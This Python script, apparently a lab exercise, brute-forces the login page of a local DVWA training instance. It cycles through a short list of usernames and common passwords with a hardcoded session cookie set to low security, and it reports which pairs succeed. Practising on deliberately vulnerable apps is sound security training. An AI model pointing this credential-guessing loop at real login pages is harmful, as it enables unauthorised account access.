import requests

BASE = "http://127.0.0.1:4280"   
HOST = "127.0.0.1"
PHPSESSID = "72aba6dcb2b6df8126dad58c9217a1a2"  

USERS = ["admin", "gordonb", "pablo", "1337"]
PASSWORDS = ["password", "abc123", "letmein", "charley"]

with requests.Session() as s:
    s.cookies.set("PHPSESSID", PHPSESSID, domain=HOST, path="/")
    s.cookies.set("security", "low", domain=HOST, path="/")

    tries = found = 0
    for u in USERS:
        for p in PASSWORDS:
            tries += 1
            r = s.get(f"{BASE}/vulnerabilities/brute/",
                      params={"username": u, "password": p, "Login": "Login"},
                      timeout=8, allow_redirects=True)

            bad = "username and/or password incorrect" in r.text.lower()
            print(f"[{'BAD' if bad else 'OK '}] {u}:{p}")
            if not bad: found += 1

    print(f"[DONE] intentos={tries} | válidos={found}")
